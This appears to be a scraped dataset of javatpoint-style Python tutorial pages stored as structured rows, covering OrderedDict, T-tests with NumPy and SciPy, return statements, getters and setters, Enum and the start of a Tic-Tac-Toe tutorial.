'user_dict = {}', ""user_dict['PP'] = 10"", ""user_dict['QQ'] = 20"", ""user_dict['RR'] = 30"", ""user_dict['SS'] = 40"", ""user_dict['TT'] = 50"", ""user_dict['UU'] = 60"", 'for item in user_dict.items():', 'print(item)', '#now, we will change the value for key QQ', ""user_dict['QQ'] = 111"", ""print('After changing value of specific key in Dict')"", 'for item in user_dict.items():', 'print(item)', 'print()', '#we will create ordered dict', ""print('OrderedDict:')"", 'user_ordered_dict = collections.OrderedDict()', ""user_ordered_dict['PP'] = 10"", ""user_ordered_dict['QQ'] = 20"", ""user_ordered_dict['RR'] = 30"", ""user_ordered_dict['SS'] = 40"", ""user_ordered_dict['TT'] = 50"", ""user_ordered_dict['UU'] = 60"", 'for item in user_ordered_dict.items():', 'print(item)', '# now, we will change the value for specific key QQ', ""user_ordered_dict['QQ'] = 111"", ""print('After changing value of specific key in Ordered Dict')"", 'for item in user_ordered_dict.items():', 'print(item)', 'import collections', '#we will create ordered dict', ""print('OrderedDict:')"", 'user_ordered_dict = collections.OrderedDict()', ""user_ordered_dict['PP'] = 10"", ""user_ordered_dict['QQ'] = 20"", ""user_ordered_dict['RR'] = 30"", ""user_ordered_dict['SS'] = 40"", ""user_ordered_dict['TT'] = 50"", ""user_ordered_dict['UU'] = 60"", 'for item in user_ordered_dict.items():', 'print(item)', '#First we will delete item in key RR', ""user_ordered_dict.pop('RR')"", ""print('After Deleting the key')"", 'for item in user_ordered_dict.items():', 'print(item)', '#now, we will re-inserte the item', ""user_ordered_dict['RR'] = 30"", ""print('After Re-inserting the key and value')"", 'for item in user_ordered_dict.items():', 'print(item)', 'from collections import OrderedDict', ""user_ordered_dict = OrderedDict([('Jake', '10'), ('John', '20'), ('Ross', '40')])"", 'print(""The current dictionary values are :"")', 'print(user_ordered_dict)', ""user_ordered_dict.update({'Ryan':'70'})"", ""user_ordered_dict.move_to_end('Ryan', last = False)"", 'print(""The updated dictionary values are : "")', 'print(user_ordered_dict)', 'from collections import OrderedDict', 'def check_order(user_input, user_pattern):', 'user_dict = OrderedDict.fromkeys(user_input)', 'pattern_length = 0', 'for key,value in user_dict.items():', 'if (key == user_pattern[pattern_length]):', 'pattern_length = pattern_length + 1', 'if (pattern_length == (len(user_pattern))):', ""return 'The order of pattern is correct'"", ""return 'The order of pattern is incorrect'"", ""user_input = 'Hello Jake'"", ""input_pattern = 'Ja'"", 'print(""The string is "")', 'print(user_input)', 'print(""The input pattern is "")', 'print(input_pattern)', 'print(check_order(user_input,input_pattern))', ""user_input = 'Hello Jake'"", ""input_pattern = 'ke'"", 'print(""The string is "")', 'print(user_input)', 'print(""The input pattern is "")', 'print(input_pattern)', 'print(check_order(user_input,input_pattern))']","['Dict:', ""('PP', 10)"", ""('QQ', 20)"", ""('RR', 30)"", ""('SS', 40)"", ""('TT', 50)"", ""('UU', 60)"", 'OrderedDict:', ""('PP', 10)"", ""('QQ', 20)"", ""('RR', 30)"", ""('SS', 40)"", ""('TT', 50)"", ""('UU', 60)"", 'Dict:', ""('PP', 10)"", ""('QQ', 20)"", ""('RR', 30)"", ""('SS', 40)"", ""('TT', 50)"", ""('UU', 60)"", 'After changing value of specific key in Dict', ""('PP', 10)"", ""('QQ', 111)"", ""('RR', 30)"", ""('SS', 40)"", ""('TT', 50)"", ""('UU', 60)"", 'OrderedDict:', ""('PP', 10)"", ""('QQ', 20)"", ""('RR', 30)"", ""('SS', 40)"", ""('TT', 50)"", ""('UU', 60)"", 'After changing value of specific key in Ordered Dict', ""('PP', 10)"", ""('QQ', 111)"", ""('RR', 30)"", ""('SS', 40)"", ""('TT', 50)"", ""('UU', 60)"", 'OrderedDict:', ""('PP', 10)"", ""('QQ', 20)"", ""('RR', 30)"", ""('SS', 40)"", ""('TT', 50)"", ""('UU', 60)"", 'After Deleting the key', ""('PP', 10)"", ""('QQ', 20)"", ""('SS', 40)"", ""('TT', 50)"", ""('UU', 60)"", 'After Re-inserting the key and value', ""('PP', 10)"", ""('QQ', 20)"", ""('SS', 40)"", ""('TT', 50)"", ""('UU', 60)"", ""('RR', 30)"", 'The current dictionary values are :', ""OrderedDict([('Jake', '10'), ('John', '20'), ('Ross', '40')])"", 'The updated dictionary values are :', ""OrderedDict([('Ryan', '70'), ('Jake', '10'), ('John', '20'), ('Ross', '40')])"", 'The string is', 'Hello Jake', 'The input pattern is', 'Ja', 'The order of pattern is correct', 'The string is', 'Hello Jake', 'The input pattern is', 'ke', 'The order of pattern is incorrect']",[],"[""|||First, we have imported the required packages.|||Then, we have created the Ordered Dictionary by using OrdereDict.|||We used the 'update' method for specifying the key and its value.|||Then, we used the 'move_to_end' function for moving the key and its value to the end.|||The required output is displayed.||||||First, we imported the required packages.|||Then, we defined the 'check_order' method, which will take two parameters.|||We have then created the ordered dictionary by using the 'fromkeys' method.|||We have initialized the length of the pattern to 0.|||If the key is equal to the pattern, then the length of the pattern will be incremented.|||But, if the length of the pattern is the same as the current length, this means the order is correct. Otherwise, the order is incorrect.|||""]"
206,['T-Test in Python'],"['As we all know, Python provides various Statistics Libraries, in which some are pretty popular such as PyMC3 and SciPy. These libraries provide users different pre-defined functions in order to compute various tests. But in order to understand the mathematics behind the process, it is imperious to understand what is happening in the background. In the following tutorial, we will understand how to perform a T-test in Python using NumPy.']","['https://www.javatpoint.com/python-return-statement', 'https://www.javatpoint.com/ordereddict-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-scipy', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/numpy-tutorial', 'https://www.javatpoint.com/python-return-statement', 'https://www.javatpoint.com/ordereddict-in-python', 'https://www.javatpoint.com/python-return-statement']","['https://static.javatpoint.com/python/images/t-test-in-python1.png', 'https://static.javatpoint.com/python/images/t-test-in-python2.png', 'https://static.javatpoint.com/python/images/t-test-in-python3.png', 'https://static.javatpoint.com/python/images/t-test-in-python4.png']",[],['Performing a Sample T-test'],"['An Introduction', 'Understanding T-test', 'Understanding T-score', 'Understanding T-values and P-values', 'What are the Types of T-tests?', 'Determining a null and alternate hypothesis', 'Collecting sample data', 'Determining a Confidence interval and degrees of freedom', 'Calculating the T-Statistic', 'Calculating the critical T-value from the T-Distribution']",[],"['But before we get started, let us understand what the T-test is.', 'Now, let us understand some examples.', 'Now, let us understand what T-score is.', 'Thus, we can conclude that the following:', 'Now, let us understand the T-values and P-values.', 'Now, let us understand the types of T-tests.', 'There are Three significant Types of T-test:', 'Now, let us start performing a sample T-test.', 'We will follow the steps given below:', 'Step 1: Determining a Null and Alternate Hypothesis', 'Step 2: Collecting Sample data', 'Step 3: Determining a Confidence Interval and Degrees of Freedom', 'Step 4: Calculating the T-Statistics', 'Step 5: Calculating the critical T-value from the T-Distribution', 'Step 6: Comparing the critical T-values with the calculated T-Statistics', 'Let us begin understanding the above steps in brief.', 'We can calculate the t-statistic by using the following formula:', 'n = number of scores per group', 'x = individual scores', 'n = number of scores in group', 'However, Python provides a function in the SciPy library that serves the same purpose.', 'Comparing the critical T-values with the calculated T-Statistic', 'Let us consider the following Python program demonstrating the working of the model.', 'Explanation:']","[""Suppose that we need to test if the men's height in the population differs from the women's height in general. Thus, we will take a sample from the population and utilize the T-test to check whether the result is significant or not."", 'Moreover, Mx and My are the values of the mean of the two female and male samples. Nx and Ny are the sample space of the two samples, and S is the standard deviation.']","['A T-test is among the most frequently utilized procedures in statistics. However, many people who even use T-test frequently do not precisely know what happens to their data when wheeled away and operated upon in the background using the applications such as R and Python.', ""The T-test is the test that compares two averages, also known as means, and tells us whether they differ from each other or not. The T-test is also known as Student's T-test, and it also tells us how significant the differences are. In other terms, it provides us knowledge of whether those differences could have occurred by chance."", 'Suppose we have a fever and we try a naturalistic medication. The fever lasts for some days. The next time we have a fever, we go to the medical store and buy an over-the-counter pharmaceutical. This time the fever lasts for a week. When we survey our friends, we found out that their fever lasted for a shorter time (an average of 3 days) when they took the homeopathic medication. In this survey, what we need to know is, are these outcomes repeatable? A T-test will let us know the means of the two groups by comparing and also the probability of those outcomes occurring by chance.', 'We can also use Student\'s T-test in real life in order to compare means. For instance, a drug company wants to test a new cancer drug in order to check its improvement in life expectancy. In an experiment, there is generally a control group (A group that is provided with a \'sugar pill"" or placebo). The control group may display a mean life expectancy of more than five years, whereas the group consuming the new drug might have a life expectancy of more than six years. As a result, we can say that the drug might work; however, there is a chance it could be because of a fluke. Thus, to test this, researchers will utilize a Student\'s T-test in order to find out whether the outcomes are repeatable for a whole population or not.', 'A Ratio between the difference between two groups and the difference within the groups is known as the T-score. If the T-score is more significant, this means that there is more difference present between the groups. At the same time, the smaller T-score signifies the similarities between the groups. A T-score of Three (3) indicates that the group is three times different from each other and within each other. When we get a bigger T-value while running a T-test, it more list that the outcomes are repeatable.', ""Every T-value contains a P-value to work with it. A P-value is referred to as the probability that the outcomes from the sample data happened coincidentally. P-values have values starting from 0% to 100%. They are generally written as a decimal. For instance, a P-value of 10% is 0.1. It is good to have low P-values. Lower P-values indicate that the data did not happen coincidentally. For instance, a P-value of 0.1 indicates that there is only a 1% probability that the experiment's outcomes occurred coincidentally. Generally, in many cases, a P-value of 5%, that is 0.05, is accepted to mean the data is said to be valid."", 'Starting with defining a null and alternate hypothesis is necessary. In general, the null hypothesis will express that the two being tested populations have no significant difference statistically. On the other hand, the alternate hypothesis will express that there is one present. For this example, we can conclude the following statements:', 'Once we determined the hypothesis, we will start collecting the data from each population group. For this example, we will be collecting two sets of data. The one data set containing the height of men and the other one with the height of men. The size of sample data ideally needs to be identical; however, it can be different. Suppose that the sizes of sample data are nx and ny.', 'Confidence interval is generally called alpha (α). The typical value of alpha (α) is 0.05. This statement implies that there is 95% confidence for the valid conclusion of the test. We can define the degree of freedom by using the formula given below:', ""We require two objects in order to calculate the critical t-value. The first is the alpha's chosen value, and the other is the degrees of freedom. The formula of critical t-value is complex; however, it is static for a fixed degree of freedom pair and the alpha's value. We thus, utilize a table in order to calculate the critical t-value."", 'Once the critical T-value is calculated, we will compare the value with the T-Statistic that we have calculated earlier. If the critical t-value is less than the calculated T-Statistic, the test deduces that a significant difference is present between the two populations statistically. Hence, we have to reject the null hypothesis that no significant difference is present between the two samples statistically.', ""However, in another case where there is no significant difference between the two populations, the test fails to reject the null hypothesis. Thus, we accept the alternate hypothesis implying that the men's and women's height are statistically different."", 'In the above example, we have imported the required libraries and defined the variable containing the sample size of the data. We have then calculated the Gaussian Distributed Data and Standard Deviation. After that, we have calculated the T-Statistic and compared it with the critical T-value. For this, we have calculated the degrees of freedom and compare the p-value. Once the comparison is made, we have printed the values for the users. At last, we have used the function of the SciPy package to compare the values again and printed them.']","['# Importing the required libraries and packages', 'import numpy as np', 'from scipy import stats', '# Defining two random distributions', '# Sample Size', '# Gaussian distributed data with mean = 2 and var = 1', 'x = np.random.randn(N) + 2', '# Gaussian distributed data with mean = 0 and var = 1', 'y = np.random.randn(N)', '# Calculating the Standard Deviation', '# Calculating the variance to get the standard deviation', 'var_x = x.var(ddof = 1)', 'var_y = y.var(ddof = 1)', '# Standard Deviation', 'SD = np.sqrt((var_x + var_y) / 2)', 'print(""Standard Deviation ="", SD)', '# Calculating the T-Statistics', 'tval = (x.mean() - y.mean()) / (SD * np.sqrt(2 / N))', '# Comparing with the critical T-Value', '# Degrees of freedom', 'dof = 2 * N - 2', '# p-value after comparison with the T-Statistics', 'pval = 1 - stats.t.cdf( tval, df = dof)', 'print(""t = "" + str(tval))', 'print(""p = "" + str(2 * pval))', '## Cross Checking using the internal function from SciPy Package', 'tval2, pval2 = stats.ttest_ind(x, y)', 'print(""t = "" + str(tval2))', 'print(""p = "" + str(pval2))']","['Standard Deviation = 0.7642398582227466', 't = 4.87688162540348', 'p = 0.0001212767169695983', 't = 4.876881625403479', 'p = 0.00012127671696957205']",[],"['|||A large T-score implies that the groups are different from each other.|||A small T-score implies that the groups are similar.||||||Independent Samples T-test: This test is used to compare the averages or means for two groups.|||Paired Sample T-test: This test is used to compare means from the same group at different times (For example, one year apart).|||One Sample T-test: This test is used to test the mean of a single group against an acknowledged mean.||||||Null Hypothesis: The height of men & women is the same.|||Alternate Hypothesis: The height of men differs from the height of women.|||']"
207,['Python return statement'],['The Python return statement is used to return a value from a function. The user can only use the return statement in a function. It cannot be used outside of the Python function. A return statement includes the return keyword and the value that will be returned after that.'],"['https://www.javatpoint.com/getter-and-setter-in-python', 'https://www.javatpoint.com/t-test-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/c-programming-language-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/cpp-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/java-tutorial', 'https://www.javatpoint.com/getter-and-setter-in-python', 'https://www.javatpoint.com/t-test-in-python', 'https://www.javatpoint.com/getter-and-setter-in-python']","['https://static.javatpoint.com/python/images/python-return-statement1.png', 'https://static.javatpoint.com/python/images/python-return-statement2.png', 'https://static.javatpoint.com/python/images/python-return-statement3.png', 'https://static.javatpoint.com/python/images/python-return-statement4.png', 'https://static.javatpoint.com/python/images/python-return-statement5.png', 'https://static.javatpoint.com/python/images/python-return-statement6.png', 'https://static.javatpoint.com/python/images/python-return-statement7.png', 'https://static.javatpoint.com/python/images/python-return-statement8.png']",[],['Introduction'],"['Syntax of return statement:', 'Returning Multiple Values', 'Function returning another function']",[],"['In the Python programming language, a user can return multiple values from a function. The following are the various methods for this.', '3. Using list: The list is similar to the dynamically sized array. In the list, the user can store everything in a single variable.', '5. Using Data Class (Python 3.7+)', 'In the Python programming language, a function is in the form of an object. Therefore, the user can return a function from another function.', 'In the below program, The first_add function returns the second_add function.']","['1. Using Object: This method is similar to C / C ++ and Java. A user can create a class to hold multiple values in a function and return an object of that class.', '2. Using Tuple: The tuple is similar to a list, but there is a slight difference between tuple and list. In the tuple, the object values cannot be changed, while the object value can be changed in the list.', '4. Using dictionary: In the Python language, a dictionary is a collection of unstructured items that are used to store data values such as hash or map.']",[],"['def funtion_name():', 'statements', 'return [expression]', 'def adding(x, y):', 'i = x + y', 'return i', 'result = adding(16, 25)', ""print(f'Output of adding(16, 25) function is {result}')"", 'def adding(a, b):', '# this function is return the value of (a + b)', 'return a + b', 'def boolean_function(a):', '# this function is return the Boolean value', 'return bool(a)', '# calling function', 'flag = adding(2, 3)', 'print(""Output of first function is {}"".format(flag))', 'flag = boolean_function(9 < 5)', 'print(""\\nOutput of second function is {}"".format(flag))', 'class a:', 'def __init__(self):', 'self.omg = ""javatpoint is the best website to learn""', 'self.i = 122', '# This function will return an object of the class a', 'def test():', 'return a()', '# Driver code to test the above method', 'z = test()', 'print(z.omg)', 'print(z.i)', 'def test():', 'omg = ""javatpoint is the best website to learn""', 'i = 122', 'return omg, i;', '# Return tuple, we could also.', '# Driver code to test the above method.', 'omg, i = test()', '# Assign return tuple', 'print(omg)', 'print(i)', 'def test():', 'omg = ""javatpoint""', 'i = 122', 'return [omg, i];', '# Driver code to test the above method', 'list = test()', 'print(list)', 'def test():', 'a = dict();', 'a[\'omg\'] = ""javatpoint""', ""a['i'] = 122"", 'return a', '# Driver code to test the above method', 'a = test()', 'print(a)', 'from dataclasses import dataclass', '@dataclass', 'class Book_list:', 'bookname: str', 'cost: float', 'quantity_of_book_available: int = 0', '# This function is used to calculate the total cost of the books', 'def total_cost_of_book(self) -> float:', 'return self.cost * self.quantity_of_book_available', 'book = Book_list(""Python programming language."", 499, 10)', 'i = book.total_cost_of_book()', '# print the total cost', 'print(i)', '# print the details of the book', 'print(book)', 'def first_add(x):', 'def second_add(y):', 'return x + y', 'return second_add', 'i = first_add(20)', 'print(""The value of x + y is"", i(10))', '# second function', 'def outer_func(x):', 'return x * 5', 'def func():', '# return the value in the different function', 'return outer_func', '# storing the function in z', 'z = func()', 'print(""\\nThe value of x * y is"", z(10))']",[],[],[]
208,['Getter and Setter in Python'],"[""Getters and setters in Python are different from those in other OOPs languages. The primary use of getters and setters is to ensure data encapsulation in object-oriented programs. In contrast to other object-oriented languages, private variables in Python are not hidden fields. Some OOPs languages use getters and setter's methods for data encapsulation. We want to conceal an object class's attributes from other classes so that methods in other classes don't accidentally modify data.""]","['https://www.javatpoint.com/enum-class-in-python', 'https://www.javatpoint.com/python-return-statement', 'https://www.javatpoint.com/https://www.javatpoint.com/python-oops-concepts', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/enum-class-in-python', 'https://www.javatpoint.com/python-return-statement', 'https://www.javatpoint.com/enum-class-in-python']",[],[],"['What is Getter in Python?', 'What is Setter in Python?', 'Using the normal function to achieve getters and setter behavior:', 'Using the property() function to achieve getters and setter behavior', 'Using the @property decorators to achieve getters and setter behavior:', 'Making the attributes private', 'Reading the values from private methods']","['Example:', 'Example:', 'Example:', 'Example:', 'Example:']",[],"['Generally, getters and setters are mainly used to ensure the data encapsulation in OOPs.', 'There will be no special implementation if we specify normal get() and set() methods to achieve the getters & setters property.', ""Let's take an example to understand how we may use the normal function to achieve the getters and setter function."", 'Output: After executing this above code, we will get the output as shown below:', 'The output is:', 'Explanation:', ""Let's take an example to understand how we can use the property() function to achieve getters and setters behavior."", 'Output: After executing this above code, we will get the output as shown below:', 'The output is:', 'Explanation:', ""Let's take an example to understand how we can use the @property decorators to achieve the getters and setter behavior."", 'Output: After executing the above code, we will get the output as shown below:', 'The output is:', 'Explanation:', ""Let's take an example to understand how we can make the attributes private in the program."", 'Output: After executing this above code, we will get the output as shown below:', 'Output: After executing this above code, we will get the output as shown below:', 'The output is:', ""Let's take another example to create a class with properties. From that class we may several objects."", 'Output: After executing this above code, we will get the output as shown below:', 'The output is:']","[""Getters are the methods that are used in Object-Oriented Programming (OOPS) to access a class's private attributes. The setattr() function in Python corresponds to the getattr() function in Python. It alters an object's attribute values."", ""The setter is a method that is used to set the property's value. It is very useful in object-oriented programming to set the value of private attributes in a class."", 'To achieve such functionality, the functions get age() and set age() in the above code operate as standard functions do not affect getters and setters. Python has a unique function property ().', 'The preceding code demonstrates how to use the @property decorator to build pythonic getters and setters. The above example serves as validation code, raising a ValueError if we attempt to initialize age with a value less than 20.', ""To read the value from private methods, we have to use the getter method. Without using the getter method, we can't use the property method to access the private attribute values. Let's take an example to understand this method."", 'The property (Emp) is not set on these objects. We could set it directly, but that is not a good method. We construct two methods instead: getEmp() and setEmp().']","[""In OOPs languages, getters and setters are used to retrieve and update data. A getter retrieves an object's current attribute value, whereas a setter changes an object's attribute value. In this article, we are going to discuss the getter and setter in Python with examples."", 'In Python, property() is a built-in function for creating and returning a property object. There are three methods on a property object: getter(), setter(), and delete(). In Python, the property() function takes four arguments: property(fget, fset, fdel, doc). The fget function is used for retrieving the attribute value. The fset function is used for setting the value of an attribute. The fdel function is used to delete the value of an attribute. The attribute is given a docstring by doc.', 'In the above program, there is only single print statement. The output consists of three lines due to the setter method set age() being called, and the getter method get age() being called. As a result, age is a property object that aids in the security of private variable access.', ""We used the property() function in the previous method to achieve getters and setters behavior. However, as previously mentioned in this article, getters and setters are also used to validate the getting and setting of attribute values. Another method for enforcing property function is to use a decorator. @property is one of Python's built-in decorators. The primary goal of any decorator is to modify the class methods or attributes so that the class user does not need to change their code."", ""Now, we'll see how to render the methods private so that external calling functions can't manipulate the variables within them. They could only be manipulated by functions that are defined within the class. They are made private by prefixing them with two underscores.""]","['class Javatpoint:', 'def __init__(self, age = 0):', 'self._age = age', '# using the getter method', 'def get_age(self):', 'return self._age', '# using the setter method', 'def set_age(self, a):', 'self._age = a', 'John = Javatpoint()', '#using the setter function', 'John.set_age(19)', '# using the getter function', 'print(John.get_age())', 'print(John._age)', 'class Javatpoint:', 'def __init__(self):', 'self._age = 0', '# using the get function', 'def get_age(self):', 'print(""getter method"")', 'return self._age', '# using the set function', 'def set_age(self, y):', 'print(""setter method"")', 'self._age = y', '# using the del function', 'def del_age(self):', 'del self._age', 'age = property(get_age, set_age, del_age)', 'John = Javatpoint()', 'John.age = 18', 'print(John.age)', 'class Javatpoint:', 'def __init__(self):', 'self._age = 0', '', '# using the getter function', '@property', 'def age(self):', 'print(""getter method"")', 'return self._age', '', '#now, using the setter function', '@age.setter', 'def age(self, x):', 'if(x < 20):', 'raise ValueError(""the age is below eligibility criteria"")', 'print(""setter method"")', 'self._age = x', 'John = Javatpoint()', 'John.age = 25', 'print(John.age)', 'class Javatpoint:', 'def __init__(self, age=49):', 'self._age = age', '# make the getter method', 'def get_age(self):', 'return self.__age', '# make the setter method', 'def set_age(self, a):', 'self.__age = a', 'grad_obj = Javatpoint()', 'print(grad_obj._age)', '# Before using setter', 'print(grad_obj.get_age())', '# After using setter', 'grad_obj.set_age(2020)', 'print(grad_obj._age)', '# A program to read the value from private method', 'class Javatpoint:', 'def __init__(self, year=27):', 'self._year = year', '@property', 'def Aboutyear(self):', 'return self.__year', '@Aboutyear.setter', 'def Aboutyear(self, x):', 'self.__year = x', 'grad_obj = Javatpoint()', 'print(grad_obj._year)', 'grad_obj.year = 2020', 'print(grad_obj.year)', 'class Javatpoint:', 'def __init__(self):', 'self.emp = ""None""', 'Mark = Friend()', 'John = Friend()', 'class Javatpoint:', 'def __init__(self):', 'self.emp = ""None""', 'def getEmp(self):', 'return self.emp', 'def setEmp(self, emp):', 'self.emp = emp', 'Mark = Javatpoint()', 'John = Javatpoint()', 'Mark.setEmp(""Developer"")', 'John.setEmp(""Designer"")', 'print(John.emp)', 'print(Mark.emp)']","['19', '19', 'setter method', 'getter method', '18', 'setter method called', 'getter method called', '25', '49', '27', '2020', 'Designer', 'Developer']",[],[]
209,['Enum class in Python'],['Enum is the class in Python used for developing the enumerations. Enumeration is the set of symbolic members or names which are bounded to the constant and unique values. The members of the enumeration can be equated by using these symbolic names. The enumeration can be repeated by itself over them.'],"['https://www.javatpoint.com/destructors-in-python', 'https://www.javatpoint.com/getter-and-setter-in-python', 'https://www.javatpoint.com/destructors-in-python', 'https://www.javatpoint.com/getter-and-setter-in-python', 'https://www.javatpoint.com/destructors-in-python']",[],[],"['How to print Enum as an Iterable list', 'How to Hash Enum Class', 'How to access Enum members', 'How to Compare the Enums', 'Conclusion']",[],[],"['The characteristics of the Enum class are:', 'The users can print the Enum class as an iterable list.', 'In the following example, we will use for loop to print all the members of the Enum class.', 'The members of the Enum class are called Enumeration, and also hashable. Therefore, these members can be used for sets and dictionaries. ', 'In the following example, we will show how users can hash the Enum class.', 'The users can access the members of the Enum class by using the value or the name of the member items.', 'In the following example, we will show how the users can access the value by name where we have used the name of the Enum as an index.', 'The users can compare the Enums simply by using the comparison operator.', 'For example:']","['In this article, we have discussed the Enum class of Python and its characteristics. We also showed how the user could print the Enum class as an iterable list. How the users can hash and access the members of the Enum class.']",[],"['import enum', '# we will use enum class for creating enumerations', 'class Weekdays(enum.Enum):', 'Sunday = 1', 'Monday = 2', 'Tuesday = 3', 'Wednesday = 4', 'Thursday = 5', 'Friday = 6', 'Saturday = 7', '# we will print the enum member as the string', 'print ("" The member of Enum class as the string is : "",end = "" "")', 'print (Weekdays.Monday)', '# we will print the enum member as a repr object', 'print ("" The member of Enum class as a repr is : "",end = "" "")', 'print (repr(Weekdays.Sunday))', '# now we will check the type of enum member', 'print ("" The type of the member of Enum class is : "",end = "" "")', 'print (type(Weekdays.Saturday))', '# we will print name of enum member', 'print ("" The name of the member of Enum class is : "",end = "" "")', 'print (Weekdays.Friday.name)', 'import enum', '# we will user enum class for creating enumerations', 'class Weekdays(enum.Enum):', 'Sunday = 1', 'Monday = 2', 'Tuesday = 3', 'Wednesday = 4', 'Thursday = 5', 'Friday = 6', 'Saturday = 7', '# now we will print all enum members by using for loop', 'print ("" The member of Enum class are : "")', 'for weekday in (Weekdays):', 'print(weekday)', 'import enum', '# we will use enum class for creating enumerations', 'class Days(enum.Enum):', 'Sunday = 1', 'Monday = 2', '# we will Hash for creating a dictionary', 'Daytype = {}', ""Daytype[Days.Sunday] = 'Sun God'"", ""Daytype[Days.Monday] = 'Mon God'"", '# now we will Check if the hashing is successful', ""if Daytype =={Days.Sunday:'Sun God',Days.Monday:'Mon God'}:"", 'print ("" Enum class is hashed "")', 'else: print ("" Enum class is not hashed "")', 'import enum', '# we will use enum class for creating enumerations', 'class Days(enum.Enum):', 'Sunday = 1', 'Monday = 2', 'Tuesday = 3', 'Wednesday = 4', 'Thursday = 5', 'Friday = 6', 'Saturday = 7', ""print('The member of Enum class accessed by name: ')"", ""print (Days['Monday'])"", ""print('The member of Enum class accessed by name: ')"", ""print (Days['Friday'])"", ""print('The member of Enum class accessed by Value: ')"", 'print (Days(1))', ""print('The member of Enum class accessed by Value: ')"", 'print (Days(5))', 'import enum', '# we will use enum class for creating enumerations', 'class Days(enum.Enum):', 'Sunday = 1', 'Monday = 2', 'Tuesday = 1', 'Wednesday = 4', 'Thursday = 5', 'Friday = 4', 'Saturday = 7', 'if Days.Sunday == Days.Tuesday:', ""print('Match')"", ""else: print ('Do not Match')"", 'if Days.Monday != Days.Tuesday:', ""print('Do not Match')"", ""else: print ('Match')"", 'if Days.Wednesday == Days.Friday:', ""print('Match')"", ""print ('Do not Match')"", 'if Days.Thursday != Days.Friday:', ""print('Do not Match')"", ""print ('Match')""]","['The member of Enum class as the string is :  Weekdays.Monday', 'The member of Enum class as a repr is :', 'The type of the member of Enum class is :', 'The name of the member of Enum class is :  Friday', 'The member of Enum class are :', 'Weekdays.Sunday', 'Weekdays.Monday', 'Weekdays.Tuesday', 'Weekdays.Wednesday', 'Weekdays.Thursday', 'Weekdays.Friday', 'Weekdays.Saturday', 'Enum class is hashed', 'The member of Enum class accessed by name:', 'Days.Monday', 'The member of Enum class accessed by name:', 'Days.Friday', 'The member of Enum class accessed by Value:', 'Days.Sunday', 'The member of Enum class accessed by Value:', 'Days.Thursday', 'Match', 'Do not Match', 'Match', 'Do not Match']",[],"[""|||The users can check the types of Enum by using the type() method.|||By using the 'name' keyword, the users can display the name of the Enum.|||The Enum is the evaluable string representation of the object known as repr().|||""]"
210,['Tic-Tac-Toe in Python'],"['In the following tutorial, we will create a game known as Tic-Tac-Toe using the Python programming language from scratch. We have divided the whole program into various steps for better understanding. But before we get into the procedure, let us understand about the game.']","['https://www.javatpoint.com/python-asynchronous-programming-asyncio-and-await', 'https://www.javatpoint.com/python-program-to-find-intersection-of-two-lists', 'https://www.javatpoint.com/https://static.javatpoint.com/python/download/TicTacToe.py', 'https://www.javatpoint.com/python-asynchronous-programming-asyncio-and-await', 'https://www.javatpoint.com/python-program-to-find-intersection-of-two-lists', 'https://www.javatpoint.com/python-asynchronous-programming-asyncio-and-await']",[],[],"['What is Tic-Tac-Toe?', 'Design of Tic-Tac-Toe', 'Storing Data using the Data Structures', 'Understanding the Game Loop', 'Updating the Game information', 'Checking Win or Tie', 'Switching the current player', 'Entering the Names of the Players', 'Storing the Information regarding the Game', 'Designing the Scoreboard', 'Creating an Outer Game Loop', 'Handling and Assigning the Selections for Player', 'Executing the Game', 'Updating the Scoreboard', 'Switching the Selecting Player', ""It's Gameplay Time""]",[],"['Note: The above data can be accessed with the help of Grid Status. However, it will require us to traverse this information every Time we want the positions of the player. This can be known as Time versus Space Complexity Trade-off. It is a general technique in order to conserve Time.', ""Note: The curplayer variable stores the current player making a move, as in 'X' or 'O'.""]","['Now, let us understand the design of Tic-Tac-Toe.', 'We will be using the command prompt in order to play Tic-Tac-Toe. Thus, it is the primary objective to construct a design for the Tic-Tac-Toe game.', 'Let us understand the snippet of code to generate the grid.', 'Explanation:', 'Now, the next step is to store the data with the help of data structures.', 'At any point in Time, there are two crucial pieces of information required:', 'The syntax for the same is shown below:', 'Snippet of code:', 'Explanation:', 'There are generally three values in a list of characters that manages the Grid Status:', 'Let us consider the following snippet of code in order to design the Game Loop.', 'Explanation:', 'Handling the input from Player', 'Explanation:', 'Now, let us move onto the next step.', 'Explanation:', 'Once the val list is updated, we will call the mytictactoe() function, and the grid would look like the following:', 'Explanation:', 'Let us consider the function checking whether any player has won.', 'Explanation:', 'Explanation:', 'Since we are creating a Scoreboard, it becomes necessary for us to display the names of each player.', 'Here is the syntax is shown below for the same:', 'Explanation:', 'Explanation:', 'Explanation:', 'Let us consider the following syntax to create the Outer Gamer Loop.', 'Explanation:', 'We need to handle and store the choice of the current player for each iteration. Let us consider the following snippet of code for the same.', 'Explanation:', 'As per the selection made by the player, the data will be stored. This is significant as it will tell us which player won after every match.', 'Once all the required information is stored, we can execute an independent match and record the victory mark.', 'The syntax for the same has been shown below.', 'Explanation:', 'In the above snippet of code, we have stored the winner details for a single game of Tic-Tac-Toe.', 'We have to update the scoreboard after every match of the Tic-Tac-Toe game.', 'Let us consider the following snippet of code to update the scoreboard.', 'Explanation:', 'Explanation:', 'In the above snippet of code, we have again used the if-else statement to switch between the players to choose the marks (Cross or Naught).', 'Hence, we have successfully constructed our very own Tic-Tac-Toe game. The code for the game can be downloaded from this link: Click Here To Download', 'Since all the steps are finally completed, here is the final output for the game.']","['Objective: If a player needs to mark a specific block, he/she must input the corresponding digit displayed in the grid. For instance, we wanted to occupy the upper right block, and then we have to enter digit 3 in the terminal.', 'The principle of any game relies on the mechanics behind the game. Since we are creating a relatively simple and easy game, the mechanics included are simple as well.', ""Moves of each player are kept as a dictionary of a list of integers where the keys are denoted by 'X' and 'O' for the corresponding player. Their respective lists consist of the digits provided to the cells in the grid they inhabit."", 'Every game consists of some type of game loop that allows the player to play the game until a player wins or the game is a tie. In the game of Tic-Tac-Toe, every loop iteration denotes a single move made by any player.', 'As we can observe, we have used the while loop to print the values for the function mytictactoe(), generating a game loop for a single game of Tic-Tac-Toe.', ""For every iteration in the game, the player has to provide the input for his move. Let us consider the following syntax in order to handle the Player's input."", 'As per the input provided by the player, we have to update the information for the smooth 